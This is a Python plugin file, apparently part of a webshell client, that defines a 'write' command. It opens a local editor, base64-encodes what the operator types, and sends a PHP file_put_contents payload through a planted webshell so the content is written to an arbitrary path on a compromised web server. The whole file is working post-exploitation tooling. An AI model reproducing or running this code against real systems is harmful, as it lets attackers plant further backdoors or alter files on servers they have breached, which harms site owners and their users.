from re import match
from os import path, makedirs, remove
from uuid import uuid4

from libs.config import alias, color, gget
from libs.myapp import send, base64_encode, open_editor


@alias(True, func_alias="w", _type="FILE")
def run(web_file_path: str, editor: str = ""):
    """
    write

    Write files directly to the target system by notepad / vi as default or your own editor.

    eg: write {web_file_path} {editor=""}
    """
    file_name = str(uuid4())
    file_path = gget("webshell.download_path", "webshell")
    if not path.exists(file_path):
        makedirs(file_path)
    real_file_path = path.join(file_path, file_name).replace("\\", "/")
    open(real_file_path, 'a').close()
    open_editor(real_file_path, editor)
    with open(real_file_path, "r") as f:
        result = base64_encode(f.read())
        res = send(f"print(file_put_contents('{web_file_path}', base64_decode('{result}')));")
        if (not res):
            return
        text = res.r_text.strip()
        if (match(r"\d+", text)):
            print(color.green(f"\nWrite {web_file_path} success.\n"))
        else:
            print(color.red(f"\nWrite {web_file_path} failed.\n"))
    remove(real_file_path)
